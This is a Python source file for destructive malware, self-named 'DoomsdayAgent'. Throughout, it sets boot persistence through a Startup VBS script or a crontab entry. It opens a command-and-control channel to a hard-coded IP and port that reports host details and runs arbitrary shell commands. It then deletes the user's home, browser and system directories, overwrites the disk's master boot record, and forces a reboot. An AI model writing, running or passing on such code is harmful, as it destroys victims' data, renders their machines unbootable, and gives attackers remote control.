import os
import sys
import platform
import shutil
import subprocess
import time
import socket
import json
import threading
import hashlib
import ctypes
from PIL import Image, ImageDraw, ImageFont

# --- Configuration ---
CONFIG = {
    "agent_name": "DoomsdayAgent",
    "c2_server": "192.168.1.50",
    "c2_port": 4444,
    "log_dir": os.path.join(os.environ.get('USERPROFILE', os.path.expanduser('~')), "AppData", "Roaming", "Logs"),
    "hidden_dir": os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), "Microsoft", "Windows", "Temp"),
    "mbr_signature": b"DOOMSDAY_WIPED",
    "wipe_delay": 10,  # Seconds before the final wipe
    "visual_text": "are you"
}

class VisualPayload:
    """Generates and applies a 'folded' text wallpaper."""
    def __init__(self, text="are you"):
        self.text = text
        self.output_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'doomsday_wallpaper.png')
        
    def generate_wallpaper(self, width=1920, height=1080):
        img = Image.new('RGB', (width, height), color='black')
        draw = ImageDraw.Draw(img)
        font = self._get_font()
        
        # Centering
        text_bbox = draw.textbbox((0, 0), self.text, font=font)
        text_width = text_bbox[2] - text_bbox[0]
        text_height = text_bbox[3] - text_bbox[1]
        x = (width - text_width) / 2
        y = (height - text_height) / 2
        
        # Folded Effect (Pseudo-3D Shadow)
        # Layer 1: Deep Shadow
        for i in range(15, 0, -1):
            shade = int(255 * (i / 15))
            draw.text((x + i, y + i), self.text, font=font, fill=(shade, shade, shade))
        # Layer 2: Main Text
        draw.text((x, y), self.text, font=font, fill=(255, 255, 255))
        
        img.save(self.output_path)
        return self.output_path

    def _get_font(self):
        candidates = ["arialbd.ttf", "arial.ttf", "calibrib.ttf", "DejaVuSans-Bold.ttf"]
        font_paths = []
        if platform.system() == "Windows":
            font_paths.append(os.path.join(os.environ['WINDIR'], 'Fonts'))
        elif platform.system() == "Darwin":
            font_paths.append('/System/Library/Fonts')
        else:
            font_paths.append('/usr/share/fonts')
            
        for path in font_paths:
            if not os.path.exists(path): continue
            for file in os.listdir(path):
                if file.lower() in [c.lower() for c in candidates]:
                    try:
                        return ImageFont.truetype(os.path.join(path, file), 180)
                    except:
                        pass
        return ImageFont.load_default()

    def apply_wallpaper(self):
        path = self.generate_wallpaper()
        if platform.system() == "Windows":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        elif platform.system() == "Darwin":
            subprocess.run(['osascript', '-e', f'tell application "System Events" to set picture of every desktop to "{path}"'])
        else:
            subprocess.run(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{path}'])

class MBRWiper:
    """Handles low-level MBR manipulation."""
    def __init__(self):
        self.disk_path = self._identify_primary_disk()

    def _identify_primary_disk(self):
        if platform.system() == "Windows":
            return r"\\.\PhysicalDrive0"
        elif platform.system() == "Darwin":
            return "/dev/disk0"
        else:
            return "/dev/sda"

    def wipe_mbr(self):
        """Overwrites the MBR with a custom signature."""
        try:
            mbr_data = bytearray(512)
            # Inject signature
            sig = CONFIG['mbr_signature'].encode('utf-8')
            mbr_data[480:480+len(sig)] = sig
            # Keep boot signature
            mbr_data[510:512] = b'\x55\xAA'
            mbr_bytes = bytes(mbr_data)

            if platform.system() == "Windows":
                handle = ctypes.windll.kernel32.CreateFileW(
                    self.disk_path,
                    ctypes.windll.kernel32.GENERIC_WRITE,
                    ctypes.windll.kernel32.FILE_SHARE_READ | ctypes.windll.kernel32.FILE_SHARE_WRITE,
                    None,
                    ctypes.windll.kernel32.OPEN_EXISTING,
                    0,
                    None
                )
                if handle == -1:
                    raise Exception("Failed to open PhysicalDrive0. Run as Administrator.")
                
                bytes_written = ctypes.c_ulong(0)
                success = ctypes.windll.kernel32.WriteFile(
                    handle, mbr_bytes, len(mbr_bytes),
                    ctypes.byref(bytes_written), None
                )
                if not success:
                    raise Exception("WriteFile failed.")
                ctypes.windll.kernel32.CloseHandle(handle)
            else:
                with open(self.disk_path, 'r+b') as f:
                    f.write(mbr_bytes)
                    f.flush()
            print(f"[+] MBR Wiped on {self.disk_path}")
        except Exception as e:
            print(f"[-] MBR Wipe Error: {e}")

class DestructiveWiper:
    """Executes the file deletion sequence with a live CMD visualization."""
    def __init__(self):
        self.targets = self._get_deletion_targets()

    def _get_deletion_targets(self):
        """Identifies critical system and user directories."""
        home = os.environ.get('USERPROFILE', os.path.expanduser('~'))
        targets = [
            home,
            os.path.join(os.environ.get('APPDATA', home), 'Microsoft', 'Windows'),
            os.path.join(os.environ.get('LOCALAPPDATA', home), 'Google'),
            os.path.join(os.environ.get('LOCALAPPDATA', home), 'Mozilla'),
            os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'Microsoft'),
            os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'Common Files')
        ]
        # Filter out invalid paths
        return [t for t in targets if os.path.exists(t)]

    def execute_visual_destruction(self):
        """Opens a CMD window and simulates the deletion process in real-time."""
        print("[+] Opening Destruction Terminal...")
        
        # Create a batch script that we will run in a visible CMD window
        # This allows the user to see the "deletion" happening
        cmd_script = f"""
@echo off
title DOOMSDAY PROTOCOL: {CONFIG['agent_name']}
color 4f
cls
echo ==========================================
echo   EXECUTING DOOMSDAY PROTOCOL
echo ==========================================
echo.
"""
        # Add the actual deletion commands to the script
        for target in self.targets:
            # Use rmdir /s /q for directories, del /f /q /s for files
            # We wrap in a try/catch equivalent by checking existence
            cmd_script += f'if exist "{target}" (echo Wiping: {target} & rmdir /s /q "{target}" 2>nul)\n'
            
        # Final message
        cmd_script += """
echo.
echo ==========================================
echo   SYSTEM DATA DESTROYED
echo   PREPARING MBR WIPE...
echo ==========================================
"""
        # Save the script to a temp location
        script_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'doomsday_exec.bat')
        with open(script_path, 'w') as f:
            f.write(cmd_script)
            
        # Launch the CMD window
        if platform.system() == "Windows":
            subprocess.Popen(f'start cmd /c "{script_path}"', shell=True)
        else:
            # For Linux/Mac, we can't easily "open a terminal" from Python without a GUI, 
            # so we'll just print to stdout and assume the user is watching the console
            print("=== DOOMSDAY PROTOCOL: EXECUTING ===")
            for target in self.targets:
                if os.path.exists(target):
                    print(f"Wiping: {target}")
                    try:
                        shutil.rmtree(target, ignore_errors=True)
                    except Exception as e:
                        print(f"Failed to wipe {target}: {e}")
            print("=== SYSTEM DATA DESTROYED ===")

    def hard_delete(self):
        """Performs the actual deletion in the background if the CMD window was closed."""
        for target in self.targets:
            if os.path.exists(target):
                try:
                    shutil.rmtree(target, ignore_errors=True)
                except Exception as e:
                    pass

class MalwareCore:
    def __init__(self):
        self.system_info = self._gather_system_info()
        self.running = True
        self.wiper = MBRWiper()
        self.visual = VisualPayload(CONFIG['visual_text'])
        self.destructive = DestructiveWiper()
        
        os.makedirs(CONFIG['log_dir'], exist_ok=True)
        os.makedirs(CONFIG['hidden_dir'], exist_ok=True)

    def _gather_system_info(self):
        return {
            "hostname": socket.gethostname(),
            "username": os.environ.get('USERNAME', os.environ.get('USER', 'unknown')),
            "os": platform.platform(),
            "python_version": platform.python_version(),
            "ip_addresses": self._get_local_ips()
        }

    def _get_local_ips(self):
        try:
            hostname = socket.gethostname()
            return socket.gethostbyname_ex(hostname)[2]
        except Exception:
            return []

    def start(self):
        print(f"[+] {CONFIG['agent_name']} initialized. PID: {os.getpid()}")
        self._establish_persistence()
        
        # Start C2
        threading.Thread(target=self._c2_loop, daemon=True).start()
        
        # Start the Doomsday Sequence
        threading.Thread(target=self._execute_doomsday_sequence, daemon=True).start()
        
        while self.running:
            time.sleep(CONFIG['check_interval'] if 'check_interval' in CONFIG else 60)

    def _establish_persistence(self):
        if platform.system() == "Windows":
            startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            script_path = os.path.abspath(__file__)
            startup_link = os.path.join(startup_dir, f"{CONFIG['agent_name']}.vbs")
            vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw ""{script_path}""", 0
'''
            try:
                with open(startup_link, 'w') as f:
                    f.write(vbs_content)
                print(f"[+] Persistence established: {startup_link}")
            except Exception as e:
                print(f"[-] Persistence failed: {e}")
        else:
            cron_job = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
            try:
                subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", shell=True, check=True)
                print("[+] Persistence established via crontab")
            except Exception as e:
                print(f"[-] Crontab persistence failed: {e}")

    def _c2_loop(self):
        while self.running:
            try:
                c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                c2_socket.connect((CONFIG['c2_server'], CONFIG['c2_port']))
                print(f"[+] Connected to C2 at {CONFIG['c2_server']}")
                handshake = json.dumps({"type": "handshake", "info": self.system_info}).encode('utf-8')
                c2_socket.sendall(handshake)
                
                while self.running:
                    data = c2_socket.recv(4096)
                    if not data: break
                    command = json.loads(data.decode('utf-8'))
                    self._execute_command(command, c2_socket)
            except ConnectionRefusedError:
                print("[-] C2 Server Unreachable.")
            except Exception as e:
                print(f"[-] C2 Error: {e}")
            time.sleep(30)

    def _execute_command(self, command, c2_socket):
        cmd_type = command.get('type')
        params = command.get('params', {})
        
        try:
            if cmd_type == 'visual':
                self.visual.apply_wallpaper()
            elif cmd_type == 'wipe':
                self._execute_doomsday_sequence()
            elif cmd_type == 'shell':
                output = subprocess.run(params.get('cmd', ''), shell=True, capture_output=True, text=True)
                response = {"type": "shell_output", "stdout": output.stdout, "stderr": output.stderr}
                c2_socket.sendall(json.dumps(response).encode('utf-8'))
            else:
                response = {"type": "error", "msg": f"Unknown command {cmd_type}"}
                c2_socket.sendall(json.dumps(response).encode('utf-8'))
        except Exception as e:
            response = {"type": "error", "msg": str(e)}
            c2_socket.sendall(json.dumps(response).encode('utf-8'))

    def _execute_doomsday_sequence(self):
        """Orchestrates the full payload: Visual -> CMD Wipe -> MBR Wipe -> Reset."""
        print("[+] Doomsday Sequence Initiated.")
        
        # 1. Visual Payload
        try:
            self.visual.apply_wallpaper()
            print("[+] Visual Payload Deployed.")
        except Exception as e:
            print(f"[-] Visual Payload Failed: {e}")
            
        # 2. CMD Visual Destruction
        print("[+] Launching Destruction Terminal...")
        self.destructive.execute_visual_destruction()
        
        # 3. Wait for the CMD script to finish (approx time)
        time.sleep(CONFIG['wipe_delay'])
        
        # 4. Ensure deletion is complete (in case CMD was closed)
        self.destructive.hard_delete()
        
        # 5. MBR Wipe
        self.wiper.wipe_mbr()
        
        # 6. Hard Reset
        self._hard_reset()

    def _hard_reset(self, delay=3):
        print(f"[!] Hard reset in {delay} seconds...")
        time.sleep(delay)
        if platform.system() == "Windows":
            subprocess.call("shutdown /r /f /t 0")
        elif platform.system() == "Darwin":
            subprocess.call("sudo shutdown -r now")
        else:
            subprocess.call("sudo reboot -f")

if __name__ == "__main__":
    try:
        agent = MalwareCore()
        agent.start()
    except KeyboardInterrupt:
        print("\n[+] Malware terminated by user.")